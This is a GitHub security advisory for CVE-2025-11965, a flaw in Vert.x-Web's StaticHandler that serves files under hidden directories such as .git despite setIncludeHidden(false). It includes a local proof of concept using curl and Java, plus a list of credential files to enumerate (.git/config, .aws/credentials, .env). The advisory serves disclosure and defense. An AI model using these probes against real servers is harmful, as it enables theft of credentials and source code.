# [M] Vert.x-Web Access Control Flaw in StaticHandler’s Hidden File Protection for Files Under Hidden Directories

## Summary
Severity: Medium
Advisory: GHSA-h5fg-jpgr-rv9c
CVE: CVE-2025-11965
CWE: CWE-552
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-10-22
Source: https://github.com/advisories/GHSA-h5fg-jpgr-rv9c
Type: github-advisory

## Affected
- Maven: `io.vertx:vertx-web` — affected >=0 <4.5.22
- Maven: `io.vertx:vertx-web` — affected >=5.0.0 <5.0.5

## Details
# Description

There is a flaw in the hidden file protection feature of Vert.x Web’s `StaticHandler` when `setIncludeHidden(false)` is configured.

In the current implementation, only files whose final path segment (i.e., the file name) begins with a dot (`.`) are treated as “hidden” and are blocked from being served. However, this logic fails in the following cases:

- **Files under hidden directories**: For example, `/.secret/config.txt` — although `.secret` is a hidden directory, the file `config.txt` itself does not start with a dot, so it gets served.
- **Real-world impact**: Sensitive files placed in hidden directories like `.git`, `.env`, `.aws` may become publicly accessible.

As a result, the behavior does not meet the expectations set by the `includeHidden=false` configuration, which should ideally protect all hidden files and directories. This gap may lead to unintended exposure of sensitive information.

# Steps to Reproduce

```bash
1. Prepare test environment

# Create directory structure
mkdir -p src/test/resources/webroot/.secret
mkdir -p src/test/resources/webroot/.git

# Place test files
echo "This is a visible file" > src/test/resources/webroot/visible.txt
echo "This is a hidden file" > src/test/resources/webroot/.hidden.txt
echo "SECRET DATA: API_KEY=abc123" > src/test/resources/webroot/.secret/config.txt
echo "Git config data" > src/test/resources/webroot/.git/config
```

```java
2. Implement test server

import io.vertx.core.AbstractVerticle;
import io.vertx.core.Vertx;
import io.vertx.ext.web.Router;
import io.vertx.ext.web.handler.StaticHandler;

public class StaticHandlerTestServer extends AbstractVerticle {
  @Override
  public void start() {
    Router router = Router.router(vertx);

    // Configure to not serve hidden files
    StaticHandler staticHandler = StaticHandler.create("src/test/resources/webroot")
      .setIncludeHidden(false)
      .setDirectoryListing(false);

    router.route("/*").handler(staticHandler);

    vertx.createHttpServer()
      .requestHandler(router)
      .listen(8082);
  }

  public static void main(String[] args) {
    Vertx vertx = Vertx.vertx();
    vertx.deployVerticle(new StaticHandlerTestServer());
  }
}
```

```bash
3. Confirm the vulnerability

# Normal file (accessible)
curl http://localhost:8082/visible.txt
# Result: 200 OK

# Hidden file (correctly blocked)
curl http://localhost:8082/.git
# Result: 404 Not Found

# File under hidden directory (vulnerable)
curl http://localhost:8082/.git/config
# Result: 200 OK - Returns contents of Git config
```

# Potential Impact

## 1. Information Disclosure

Examples of sensitive files that could be exposed:

- `.git/config`: Git repository settings (e.g., remote URL, credentials)
- `.env/*`: Environment variables (API keys, DB credentials)
- `.aws/credentials`: AWS access keys
- `.ssh/known_hosts`: SSH host trust info
- `.docker/config.json`: Docker registry credentials

## 2. Attack Scenarios

- Attackers can guess common hidden directory names and enumerate filenames under them to access confidential data.
- Especially dangerous for `.git/HEAD`, `.git/config`, `.git/objects/*` — which may allow full reconstruction of source code.

## 3. Affected Scope

- **Affected version**: Vert.x Web 5.1.0-SNAPSHOT (likely earlier versions as well)
- **Environments**: All OSes (Windows, Linux, macOS)
- **Configurations**: All applications using `StaticHandler.setIncludeHidden(false)`

## References
- https://github.com/vert-x3/vertx-web/security/advisories/GHSA-h5fg-jpgr-rv9c
- https://nvd.nist.gov/vuln/detail/CVE-2025-11965
- https://github.com/vert-x3/vertx-web
- https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/304
